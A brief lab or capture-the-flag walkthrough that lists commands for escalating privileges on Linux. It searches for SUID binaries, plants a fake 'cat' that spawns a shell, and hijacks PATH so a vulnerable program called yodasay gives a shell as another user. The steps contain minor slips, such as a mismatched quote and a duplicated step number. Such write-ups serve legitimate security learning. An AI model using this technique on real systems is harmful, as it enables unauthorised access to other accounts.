1. Find files with SUID bit set `find / -type f -perm -u=s 2>/dev/null`
2. Find source code of yodasay in /tmp. See it calls cat with relative path
3. In /home/trooper/, our own cat that drops into a shell  `echo '/bin/sh' > cat'
4. Go to /home/officer
5. Modify PATH to point to our cat `export PATH=/home/trooper`
6. Run yodasay and get shell as officer `./yodasay`
7. Fix path `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
7. Read artifact.txt `cat artifact.txt`